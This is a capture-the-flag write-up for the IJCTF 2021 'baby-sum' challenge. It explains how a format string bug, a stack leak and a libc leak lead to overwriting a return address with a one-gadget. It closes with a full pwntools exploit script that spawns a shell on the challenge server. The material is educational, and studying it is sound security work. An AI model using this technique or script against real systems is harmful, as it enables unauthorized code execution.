Baby-sum was a pwn challenge from IJCTF 2021,

that was a bit tricky.

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/resume.png)

first we inspect the binary quickly to see the protections in place

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/prots.png)

ok let's reverse the program !!!!

the main function first:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/main_rev.png)

the welcome function :

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/welcome_rev.png)

in the welcome function, we are given a free address leak of a variable on stack (name),  then we can store whatever we want in name.

but strangely, this name string, is no more used later in the program... maybe we can use it for something else...(humm...)

then let's see the calc() function and vuln() function that is called from calc()  where all happens..

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/calc_rev.png)

the called vuln() function, that is obviously a format string vulnerability.. 

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/vuln_rev.png)

ok we can see now how the calc function operates,

it reads 3 inputs (0,1,2) on stack with scanf('%8s', &num),  num is a pointer on stack to numbers[] array that is incremented at each turn..

in theory the inputs are numbers, but as it uses scanf(%8s), we can send whatever we want, numbers, strings, except carriage return that will end the input.

the function vuln is called on input, as printf(input)  and is obviously a format string vulnerability.. we can check it by sending %p for example as input..

like always in format string vulns, I identify what is reachable on stack with various printf offsets (name are according to the calc() reverse above):

here are some offsets..
* 6  -->  address of start
* 7  -->  address of numbers[0]
* 8  --> next frame pointer (points to offset 16)
* 9  --> return address of vuln() from calc() 
* 10  --> numbers[0]     at [rbp-0x30]
* 11  --> numbers[1]     at [rbp-0x28]
* 12 --> sformat            at [rbp-0x20]    will be set to '%8s' at calc() beginning
* 13  -->  sum variable , undefined at beginning of calc()... (can be set via welcome() function , qword at (name string + 0x28)
* 14 -->  i variable    at [rbp-0x10]      incremented at each turn (0,1,2)
* 15  --> num pointer  at [rbp-8]      incremented at each turn, point to &numbers[0] at beginning..
* 16 --> next frame pointer (points to offset 20)
* 17 --> return address from calc()

so we quickly found that the undefined var (will be sum variable, later in calc()),  can be defined with the name input in welcome() function:

let's try...

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/input1.png)

ok it works, as you can see we, if we put a breakpoint to the printf in vuln() function we can see the 'BBBBBBBB' == 0x4242424242424242   in the 13th position reachable by printf... good...

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/dump1.png)

as we know (with the welcome leak) the variable addresses, we will put a pointer to i variable counter, in position 13, with the name input string in welcome() function..

like this we can send '%13$n' string as input when we want, to clear i variable counter...and write 3 more positions...

so our attack strategy will be:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/attack1.png)

num pointer points to &number[0]  at beginning of the loop,

we first send string "%1$p" to pass this position    (num --> pos 10)

then we send string "%13$n" to clear counter variable i    (num --> pos 11)

the we send string "%ld" that will replace "%8s" string at pos 12 (num --> pos12)

from now we can only enter numbers, as we changed the scanf format string to %ld, so we send '-'  that will write nothing to this position  (num --> pos13)

now num points to i (the counter)  we send -100 , as i is defined as a int64 and can be negative, so that we can write up to 102 values (num --> pos14)

now num points to itself on stack, good good!  we can modify it to move the place we will write on stack !! 

we set it to an address before on stack, that contains a libc address.. this address will be leaked by the puts() in vuln() function..

we got our libc leak, and with it calculate libc base,  that will be needed to calculate the one gadget address we will use in libc

now we pass the next 16 positions, be sending '-' string to scanf..

we are now again at i variable position, we send '0' to clear it (from now only 3 writes left before the calc() function return..

we pass the two next stack position, to reach the calc() function return address, that we replace with a one gadget address in libc..

and guess what ????

We got shell..


![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/IJCTF.2021/pwn/baby-sum/imgs/gotshell.png)


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
context.update(arch="amd64", os="linux")

exe = context.binary = ELF('./baby-sum')
libc = ELF('./libc.so.6')

host = args.HOST or '35.244.10.136'
port = int(args.PORT or 10252)

io = connect(host, port)

io.recvuntil('you: ', drop=True)
# first we read the given stack leak
stack = int(io.recvuntil('\n',drop=True),16)
print('leak stack = '+hex(stack))

# the name 6th entry will be on stack untouched, so we put a pointer
name = 'A'*40+p64(stack+0x30)

io.sendlineafter('you?\n', name)

io.sendlineafter('> ', '%1$p')
io.sendlineafter('> ', '%13$n')         # clear the i counter variable
io.sendlineafter('> ', '%ld')           # replace '%8s' string by '%ld'  no we can input numbers one by one
io.sendlineafter('> ' ,'-')             # pass the input, without writing anything
io.sendlineafter('> ' ,'-100')          # overwrite i variable with -100 (after all it is an int64)
io.sendlineafter('> ', str(stack-0x58)) # overwrite num variable to point before on stack containing a libc address, to leak it

# get our libc leak & calculate libc base
libc.address = u64(io.recvuntil('\n', drop=True).ljust(8,b'\x00')) - 0x1ec6a0
print('libc base = '+hex(libc.address))

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

onegadgets = one_gadget('libc.so.6', libc.address)

for i in range(16):
  io.sendlineafter('> ' ,'-')

io.sendlineafter('> ' ,'0')		# set i counter to 0 again (3 writes is all we need)
io.sendlineafter('> ' ,'-')
io.sendlineafter('> ' ,'-')
io.sendlineafter('> ' , str(onegadgets[1]))  # write onegadget to calc() return address , at this points i>2,  so calc() will return to our onegadget

# got shell now
io.interactive()
```

